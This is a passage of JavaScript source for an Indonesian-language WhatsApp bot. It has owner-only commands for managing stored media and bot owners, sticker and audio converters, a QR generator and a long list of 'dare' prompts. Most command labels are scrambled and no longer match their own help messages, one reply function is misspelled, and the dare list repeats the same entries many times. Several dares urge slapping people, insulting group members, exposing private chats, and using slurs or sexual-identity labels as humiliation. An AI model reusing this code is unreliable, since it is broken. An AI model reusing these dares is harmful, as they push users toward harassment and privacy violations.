fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
replygcxeon(`*Sukses Menambahkan Vidio*\nCek Dengan Perintah *${prefix}listvideo*`)
}
break
case 'delvigggdeo':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.delvideo Nama Vidio*')
if (!VideoXeon.includes(q)) return replygcxeon("*Nama Tersebut Tidak Ditemukan Dibasis Data*")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
replygcxeon(`Sukses Menghapus Vidio *${q}*`)
}
break
case 'lisbvvtvideo':{
let teks = '┌──⭓「 *DAFTAR VIDIO* 」\n│\n'
for (let x of VideoXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total: ${VideoXeon.length}*`
replygcxeon(teks)
}
break
case 'addhhhimage':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.addimage Nama Gambar*')
if (ImageXeon.includes(q)) return replygcxeon("*Nama Tersebut Sudah Digunakan*")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
replygcxeon(`*Sukses Menambahkan Gambar*\nCek Dengan Perintah *${prefix}listimage*`)
}
break
case 'dhhvelimage':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.delimage Nama Gambar*')
if (!ImageXeon.includes(q)) return replygcxeon("*Nama Tersebut Tidak Ditemukan Dibasis Data*")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
replygcxeon(`Sukses Menghapus Gambar *${q}*`)
}
break
case 'listivbvmage':{
let teks = '┌──⭓「 *DAFTAR GAMBAR* 」\n│\n'
for (let x of ImageXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total: ${ImageXeon.length}*`
replygcxeon(teks)
}
break
case 'adbbvdsticker':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.addsticker Nama Stiker*')
if (StickerXeon.includes(q)) return replygcxeon("*Nama Tersebut Sudah Digunakan*")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
replygcxeon(`*Sukses Menambahkan Stiker*\nCek Dengan Perintah *${prefix}liststicker*`)
}
break
case 'delvbvsticker':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.delsticker Nama Stiker*')
if (!StickerXeon.includes(q)) return replygcxeon("*Nama Tersebut Tidak Ditemukan Dibasis Data*")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
replygcxeon(`Sukses Menghapus Stiker *${q}*`)
}
break
case 'lihhhststicker':{
let teks = '┌──⭓「 *DAFTAR STIKER* 」\n│\n'
for (let x of StickerXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total: ${StickerXeon.length}*`
replygcxeon(teks)
}
break
case 'hjhhaddvn':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.addvn Nama VN*')
if (VoiceNoteXeon.includes(q)) return replygcxeon("*Nama Tersebut Sudah Digunakan*")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
replygcxeon(`*Sukses Menambahkan VN*\nCek Dengan Perintah *${prefix}listvn*`)
}
break
case 'djjjhelvn':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.delvn Nama VN*')
if (!VoiceNoteXeon.includes(q)) return replygcxeon("*Nama Tersebut Tidak Ditemukan Dibasis Data*")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
replygcxeon(`Sukses Menghapus VN *${q}*`)
}
break
case 'listjjjjvn':{
let teks = '┌──⭓「 *DAFTAR VN* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total: ${VoiceNoteXeon.length}*`
replygcxeon(teks)
}
break
case 'addjjuowner':
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Format: *${prefix+command} Nomor*`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`*Masukkan Nomor Sah Dan Terdaftar Diwhatsapp*`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`Akun *${bnnd}* Sekarang Pemilik Bot`)
break
case 'deiiilowner':
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Format: *${prefix+command} Nomor*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`Akun *${ya}* Sekarang Bukan Pemilik Bot`)
break
case 'listpiiuremium': case 'listjjprem':
teks = '*DAFTAR PREMIUM*\n\n'
for (let XeonBotInc of prem) {
teks += `- ${XeonBotInc}\n`
}
teks += `\n*Total: ${prem.length}*`
XeonBotInc.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setjjjexif': {
               if (!XeonTheCreator) return replygcxeon(mess.owner)
               if (!text) return replygcxeon(`Format: *${prefix + command} Nama Paket|Pengarang*`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcxeom(`*EXIF Telah Berhasil Diubah Menjadi*\n\n${themeemoji} Nama Paket: ${global.packname}\n${themeemoji} Pengarang: ${global.author}`)
            }
            break
case 'setpjiipbot': case 'setbjjotpp': {
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!quoted) return replygcxeon(`Kirim Atau Balas Gambar Dengan Perintah *${prefix + command}*`)
if (!/image/.test(mime)) return replygcxeon(`Kirim Atau Balas Gambar Dengan Perintah *${prefix + command}*`)
if (/webp/.test(mime)) return replygcxeon(`Kirim Atau Balas Gambar Dengan Perintah *${prefix + command}*`)
var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await XeonBotInc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcxeon(`*Sukses*`)
} else {
var memeg = await XeonBotInc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcxeon(`*Sukses*`)
}
}
break
case 'creajjhtegc': case 'crejjhategroup': {
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!args.join(" ")) return replygcxeon(`Format: *${prefix+command} Nama Grup*`)
try {
let cret = await XeonBotInc.groupCreate(args.join(" "), [])
let response = await XeonBotInc.groupInviteCode(cret.id)
teks = `     「 MEMBUAT GRUP 」

*Nama:* ${cret.subject}
*Pemilik:* @${cret.owner.split("@")[0]}
*Diciptakan:* ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

*https://chat.whatsapp.com/${response}*
       `
XeonBotInc.sendMessage(m.chat, { text:teks, mentions: await XeonBotInc.parseMention(teks)}, {quoted:m})
} catch {
replygcxeon("*Kesalahan*")
}
}
break
case 'stickernobg':
case 'snobg': {
if (!quoted) return replygcxeon(`Kirim Atau Repy Media Dengan Perintah *${prefix+command}*\n\n*Maksimal Durasi Vidio 9 Detik*`)
replygcxeon(mess.wait)
if (/image/.test(mime)) {
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcxeon(`Kirim Atau Repy Media Dengan Perintah *${prefix+command}*\n\n*Maksimal Durasi Vidio 9 Detik*`)
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'handhold': {
  replygcxeon(mess.wait)
const axios = require('axios')
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'jsksidi': case 'jgcfy': {
                if (!quoted) return replygcxeon('Reply Image')
                if (!/webp/.test(mime)) return replygcxeon(`Balas Gambar Dengan Perintah *${prefix + command}*`)
                replygcxeon(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'fccg': case 'ugcff': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Kirim Atau Balas Vidio/Audio Dengan Perintah *${prefix + command}*`)
            if (!quoted) return replygcxeon(`Kirim Atau Balas Gambar/Vidio Dengan Perintah *${prefix + command}*`)
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'jjsjsjsj': {
            if (/document/.test(mime)) return replygcxeon(`Kirim Atau Balas Vidio Dengan Perintah *${prefix + command}*`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Kirim Atau Balas Vidio Dengan Perintah *${prefix + command}*`)
            if (!quoted) return replygcxeon(`Kirim Atau Balas Vidio Dengan Perintah *${prefix + command}*`)
            replygcxeon(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${XeonBotInc.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'hgcc': case 'gghhv': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Kirim Atau Balas Vidio/Audio Dengan Perintah *${prefix + command}*`)
            if (!quoted) return replygcxeon(`Kirim Atau Balas Vidio/Audio Dengan Perintah *${prefix + command}*`)
            replygcxeon(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return replygcxeon('Balas Stiker Atau Vidio Dengan Perintah *${prefix + command}*')
                if (!/webp/.test(mime)) return replygcxeon(`Balas Stiker Atau Vidio Dengan Perintah *${prefix + command}*`)
                replygcxeon(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: '*Konversi WEBP Ke MP4*' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcxeon('Format: *.toqr Tautan Atau Teks*')
  replygcxeon(mess.wait)
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await XeonBotInc.sendMessage(from, { image: medi, caption:"*Sukses*"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
     "Makan nasi 2 sendok makan tanpa lauk pauk",
     "Tampar orang yang membuatmu marah",
     "Telepon crush atau pacar sekarang dan kirim ss",
     "Gunakan emoji setiap kali Anda mengetik di GC/PC selama 1 hari",
     "Ucapkan 'Selamat Datang' kepada yang ingin menjadi jutawan kepada semua grup yang Anda miliki",
     "Panggil mantan bilang kangen",
     "Nyanyikan bagian refrein dari lagu terakhir yang kamu mainkan",
     "VN Mantan/naksir/pacar kamu, sapa (nama), mau telpon, sebentar. Aku kangen",
     "Buang meja yang ada di rumah sampai dimarahi karena berisik",
     "Katakan ke sembarang orang 'Aku Baru Dikasih Tau Aku Kembaran Kamu Dulu, Kita Pisah, Trus Aku Operasi Plastik. Dan Ini Hal Yang Paling Ciyuss'",
     "Sebutkan nama mantan",
     "Buat 1 sajak untuk para member!",
     "Kirim daftar obrolan whatsapp Anda",
     "Obrolan orang secara acak dengan bahasa Gheto lalu ss di sini",
     "Ceritakan hal memalukan versimu sendiri",
     "Tag orang yang kamu benci",
     "Berpura-pura kesurupan, misalnya: kesurupan anjing, kesurupan belalang, kesurupan kulkas, dll.",
     "Ganti nama menjadi 'I Am Donkey' selama 24 jam",
     "Teriak 'Ma Chuda Ma Chuda Ma Chuda' di depan rumahmu",
     "Jepret/posting foto pacar/naksir",
     "Beritahu aku tipe pacarmu!",
     "Katakan 'Aku Naksir Kamu, Kamu Mau Jadi Pacarku?' ke lawan jenis, terakhir kali kamu chat (submit di wa/tele), tunggu dia balas, kalau punya mampir ke sini",
     "Rekam suaramu yang berbunyi 'Titar Ke Umur Do Titar, Titar Ke Piche Do Titar'",
     "Prank chat mantan dan bilang 'I Love U, Please Come Back.' tanpa bilang Dare",
     "Obrolan ke kontak wa sesuai urutan % baterai anda, lalu beritahu dia 'Saya Beruntung Bisa Mendapatkan Anda'",
     "Ganti nama jadi 'Aku Anak Randi' selama 5 jam",
     "Ketik bahasa Bengali 24 jam",
     "Gunakan foto Selmon Bhoi selama 3 hari",
     "Jatuhkan kutipan lagu lalu beri tag anggota yang cocok untuk kutipan itu",
     "Kirim catatan suara mengatakan 'Bisakah Aku Memanggilmu Sayang?'",
     "SS baru-baru ini menelepon whatsapp",
     "Katakan 'Kau Sangat Indah Jangan Berbohong' kepada teman-teman",
     "Pergi ke anggota grup, dan katakan 'Fuck You'",
     "Bertingkah seperti ayam di depan orang tuamu",
     "Ambil buku acak dan baca satu halaman dengan lantang di vn n kirimkan ke sini",
     "Buka pintu depanmu dan melolong seperti serigala selama 10 detik",
     "Ambil selfie yang memalukan dan tempel di foto profil Anda",
     "Biarkan teman anda memilih kata dan lagu terkenal, Anda harus menyanyikan lagu itu dan mengirimkannya dalam catatan suara",
     "Berjalan dengan siku dan lutut selama mungkin",
     "Nyanyikan lagu kebangsaan dengan nada suara",
     "Breakdance selama 30 detik di ruang duduk",
     "Ceritakan kisah paling menyedihkan yang kamu tahu",
     "Buat video tarian twerk dan statuskan selama 5 menit",
     "Makan sepotong bawang putih mentah",
     "Tunjukkan lima orang terakhir yang Anda kirimi SMS dan isi pesannya",
     "Cantumkan nama lengkap Anda pada status selama 5 jam",
     "Buat video dansa pendek tanpa filter apa pun hanya dengan musik dan letakkan di status Anda selama 5 jam",
     "Panggil sahabatmu 'Jalang'",
     "Letakkan foto Anda tanpa filter pada status Anda selama 10 menit",
     "katakan 'Saya Suka Oli London' di catatan suara",
     "Kirim pesan ke mantanmu dan katakan 'Aku Masih Menyukaimu'",
     "Hubungi Crush/Pacar/Sahabat sekarang dan tangkapan layar di sini",
     "Pergi ke salah satu obrolan pribadi anggota grup dan Katakan 'Kamu Bustard Jelek'",
     "Katakan 'Kamu Cantik/Tampan' kepada salah satu orang yang ada di daftar tag atas kamu atau orang pertama di daftar obrolan kamu",
     "Kirim voice note dan katakan 'Bolehkah Aku Meneleponmu Sayang', jika kamu laki-laki tag perempuan/jika kamu perempuan tag laki-laki",
     "Tulis 'I Love You (nama anggota grup acak, yang sedang online)' di obrolan pribadi, (kalau laki-laki tulis nama perempuan/kalau perempuan tulis nama laki-laki) ambil fotonya dan kirim ke sini",
     "Gunakan foto aktor Bollywood apa pun sebagai PFP Anda selama 3 hari",
     "Letakkan foto Gebetanmu di status dengan keterangan 'Ini Gebetanku'",
     "Ganti nama menjadi 'I AM GAY' selama 5 jam",
     "Ngobrol dengan kontak mana pun di Whatsapp dan katakan 'Saya Akan Menjadi BF/GF Anda Selama 5 Jam'",
     "Kirim catatan suara mengatakan aku naksir kamu, mau jadi pacarku atau tidak? ke sembarang orang dari grup (kalau kamu perempuan pilih laki-laki, kalau laki-laki pilih perempuan",
     "Tampar pantatmu dan kirimkan suara tamparannya ke sini menggunakan voice note",
     "Sebutkan tipe GF/BF kamu dan kirim fotonya ke sini dengan keterangan 'Cewek/Cowok Paling Jelek Didunia'",
     "Berteriak 'Kontol' dan kirim ke sini melalui voice note",
     "Foto wajahmu lalu kirim ke sini",
     "KIRIM foto Anda dengan keterangan 'Saya Lesbian'",
     "Berteriak menggunakan kata-kata kasar dan kirimkan ke sini melalui voice note",
     "Teriak 'Kau Bajingan' di depan Ibu/papamu",
     "Ganti nama menjadi 'Saya Idiot' selama 24 jam",
     "Tampar dirimu dengan keras dan kirim suara tamparan melalui voice note",
     "Katakan saya suka pemilik Bot Hoshino melalui voice note",
     "Kirim foto GF/BF kamu ke sini",
     "Buat video tantangan dance Tik Tok apa saja dan jadikan status, Anda dapat menghapusnya setelah 5 jam",
     "Putus dengan sahabatmu selama 5 jam tanpa memberitahunya bahwa itu tantangan",
      "Katakan pada salah satu temanmu bahwa kamu mencintainya dan ingin majak dia, tanpa memberitahu dia bahwa itu adalah tantangan",
      "Katakan 'Aku Cinta Depak Kalal' lewat voice note",
      "Tulis saya merasa terangsang dan letakkan di status, Anda dapat menghapusnya hanya setelah 5 jam",
      "Tulis 'Saya Lesbian' dan letakkan di status, kamu hanya bisa menghapusnya setelah 5 jam",
      "Cium Ibu atau Papamu dan katakan 'Aku Mencintaimu'",
      "Cantumkan nama Ayahmu di status selama 5 jam",
      "Kirim kata-kata kasar di grup mana pun kecuali grup ini dan kirim bukti tangkapan layar di sini",
   "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan dan kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan kreatif sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai dan tenang, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu dengan suara yang ceria dan kocak, dan bagikan di grup.",
    "Tunjukkan gerakan tari salsa kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang penuh semangat dan kreatif.",
    "Ambil foto objek seni di sekitarmu dengan sudut pandang yang unik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang teknologi favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam pilates kepada teman-temanmu.",
    "Buat mimik wajah paling ekspresif dan konyol sekaligus, dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan dan kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan kreatif sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai dan tenang, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu dengan suara yang ceria dan kocak, dan bagikan di grup.",
    "Tunjukkan gerakan tari salsa kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang penuh semangat dan kreatif.",
    "Ambil foto objek seni di sekitarmu dengan sudut pandang yang unik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang teknologi favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam pilates kepada teman-temanmu.",
    "Buat mimik wajah paling ekspresif dan konyol sekaligus, dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan dan kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan kreatif sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai dan tenang, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu dengan suara yang ceria dan kocak, dan bagikan di grup.",
    "Tunjukkan gerakan tari salsa kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang penuh semangat dan kreatif.",
    "Ambil foto objek seni di sekitarmu dengan sudut pandang yang unik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang teknologi favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam pilates kepada teman-temanmu.",
    "Buat mimik wajah paling ekspresif dan konyol sekaligus, dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan dan kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan kreatif sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai dan tenang, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu dengan suara yang ceria dan kocak, dan bagikan di grup.",
    "Tunjukkan gerakan tari salsa kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang penuh semangat dan kreatif.",
    "Ambil foto objek seni di sekitarmu dengan sudut pandang yang unik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang teknologi favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam pilates kepada teman-temanmu.",
    "Buat mimik wajah paling ekspresif dan konyol sekaligus, dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan dan kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan kreatif sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai dan tenang, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
   "Buat mimik wajah paling ekspresif dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh semangat dan keceriaan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan unik, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita fiksi dengan suara yang penuh emosi dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda di sekitarmu kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling kreatif dan unik sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat keras dan energik, dengan gaya bicara seperti pengumuman di stasiun radio, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari bollywood kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang menggetarkan dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang memukau dan menginspirasi, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan pengalaman menegangkan yang pernah kamu alami dengan suara yang menegangkan, dan bagikan di grup.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang ceria dan kreatif.",
    "Ambil foto objek alam yang menawan di sekitarmu dengan sudut pandang yang menarik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang makanan favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam tai chi kepada teman-temanmu.",
    "Buat mimik wajah paling menggemaskan dan lucu sekaligus, dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh semangat dan kegembiraan.",
